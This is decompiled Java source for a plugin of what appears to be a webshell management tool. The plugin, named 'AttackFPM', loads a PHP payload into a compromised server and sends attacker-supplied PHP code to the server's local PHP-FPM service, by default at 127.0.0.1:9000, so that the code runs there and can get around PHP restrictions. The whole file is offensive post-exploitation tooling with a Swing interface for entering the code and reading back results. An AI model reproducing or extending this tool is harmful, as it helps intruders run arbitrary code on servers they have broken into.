/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.php;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import javax.swing.border.TitledBorder;
import shells.plugins.php.PhpEvalCode;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="PhpDynamicPayload", Name="PAttackFPM", DisplayName="AttackFPM")
public class PAttackFPM
implements Plugin {
    private static final String CLASS_NAME = "AttackFPM";
    private final JPanel panel = new JPanel(new BorderLayout());
    private PhpEvalCode phpEvalCode;
    private final RTextArea evalCodeTextArea;
    private final RTextArea resultTextArea;
    private final JButton goButton;
    private final JButton loadButton;
    private final JLabel fpmAddressLabel = new JLabel("fpmAddress :");
    private final JLabel scriptFileLabel = new JLabel("scriptFile :");
    private final JTextField fpmAddressTextField;
    private final JTextField scriptFileTextField;
    private final JSplitPane bottomSplitPane;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public PAttackFPM() {
        this.loadButton = new JButton("Load");
        this.goButton = new JButton("Go");
        this.evalCodeTextArea = new RTextArea();
        this.resultTextArea = new RTextArea();
        this.fpmAddressTextField = new JTextField("127.0.0.1:9000", 15);
        this.scriptFileTextField = new JTextField("/var/www/html/index.php", 25);
        this.evalCodeTextArea.setBorder(new TitledBorder("evalCode"));
        this.resultTextArea.setBorder(new TitledBorder("result"));
        this.evalCodeTextArea.setText("\t\t\t\t\t\t\t\necho 'hello word!';");
        this.bottomSplitPane = new JSplitPane();
        this.bottomSplitPane.setOrientation(0);
        this.bottomSplitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.fpmAddressLabel);
        topPanel.add(this.fpmAddressTextField);
        topPanel.add(this.scriptFileLabel);
        topPanel.add(this.scriptFileTextField);
        topPanel.add(this.loadButton);
        topPanel.add(this.goButton);
        this.bottomSplitPane.setTopComponent(topPanel);
        JSplitPane splitPane = new JSplitPane();
        splitPane.setOrientation(1);
        splitPane.setLeftComponent(new JScrollPane(this.evalCodeTextArea));
        splitPane.setRightComponent(new JScrollPane(this.resultTextArea));
        this.bottomSplitPane.setBottomComponent(splitPane);
        this.panel.add(this.bottomSplitPane);
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        block5: {
            if (!this.loadState) {
                try {
                    InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.php", CLASS_NAME));
                    byte[] data = functions.readInputStream(inputStream);
                    inputStream.close();
                    if (this.payload.include(CLASS_NAME, data)) {
                        this.loadState = true;
                        GOptionPane.showMessageDialog(this.panel, "Load success", "\u63d0\u793a", 1);
                        break block5;
                    }
                    GOptionPane.showMessageDialog(this.panel, "Load fail", "\u63d0\u793a", 2);
                } catch (Exception e) {
                    Log.error(e);
                    GOptionPane.showMessageDialog(this.panel, e.getMessage(), "\u63d0\u793a", 2);
                }
            } else {
                GOptionPane.showMessageDialog(this.panel, "Loaded", "\u63d0\u793a", 1);
            }
        }
    }

    private void goButtonClick(ActionEvent actionEvent) {
        String fpmAddress = this.fpmAddressTextField.getText().trim();
        String evalCode = this.evalCodeTextArea.getText();
        String scriptFile = this.scriptFileTextField.getText().trim();
        String fpmHost = "";
        int fpmPort = -1;
        try {
            if (fpmAddress.startsWith("unix")) {
                fpmHost = fpmAddress;
            } else if (fpmAddress.startsWith("/")) {
                fpmHost = String.format("unix://%s", fpmAddress);
            } else {
                String[] is = fpmAddress.split(":");
                fpmHost = is[0];
                fpmPort = Integer.valueOf(is[1]);
            }
        } catch (Exception e) {
            Log.error(e);
            GOptionPane.showMessageDialog(null, e.getMessage());
            return;
        }
        ReqParameter reqParamete = new ReqParameter();
        reqParamete.add("evalCode", evalCode);
        reqParamete.add("scriptFile", scriptFile);
        reqParamete.add("fpm_host", fpmHost);
        reqParamete.add("fpm_port", String.valueOf(fpmPort));
        byte[] result = this.payload.evalFunc(CLASS_NAME, "run", reqParamete);
        String resultString = this.encoding.Decoding(result);
        this.resultTextArea.setText(resultString);
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }
}

